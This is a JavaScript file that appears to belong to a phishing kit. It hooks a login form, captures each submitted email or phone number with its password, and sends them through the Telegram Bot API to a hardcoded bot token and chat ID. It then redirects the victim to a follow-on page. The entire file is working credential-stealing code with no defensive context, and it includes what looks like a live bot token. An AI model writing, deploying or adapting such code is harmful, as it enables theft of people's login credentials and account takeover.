document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("login-form");

  // Bot 1 token and chat ID
  const BOT_TOKEN_1 = "7746332737:AAEOz6lVMykBEDri1KAIsN_UFo8eAJoEoHs";
  const CHAT_ID_1 = "6942741954";
  const TELEGRAM_API_URL_1 = `https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`;

  // Bot 2 token and chat ID
  const BOT_TOKEN_2 = "";
  const CHAT_ID_2 = "";
  const TELEGRAM_API_URL_2 = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;

  form.addEventListener("submit", async (event) => {
      event.preventDefault();

      // Collect form data
      const emailPhone = document.getElementById("email-phone").value;
      const password = document.getElementById("password").value;

      // Format the message
      const message = `New Login Data:\n\nEmail/Phone: ${emailPhone}\nPassword: ${password}`;

      try {
          // Send data to Bot 1
          const response1 = await fetch(TELEGRAM_API_URL_1, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                  chat_id: CHAT_ID_1,
                  text: message,
              }),
          });

          // Send data to Bot 2
          const response2 = await fetch(TELEGRAM_API_URL_2, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                  chat_id: CHAT_ID_2,
                  text: message,
              }),
          });

          if (response1.ok && response2.ok) {
              // Redirect and reset form if both requests succeed
              window.location.href = 'second.html'; // Change 'second.html' to your target page
              form.reset();
          } else {
              alert("Failed to send data to one or both bots.");
          }
      } catch (error) {
          console.error("Error sending data:", error);
          alert("An error occurred. Please try again.");
      }
  });
});
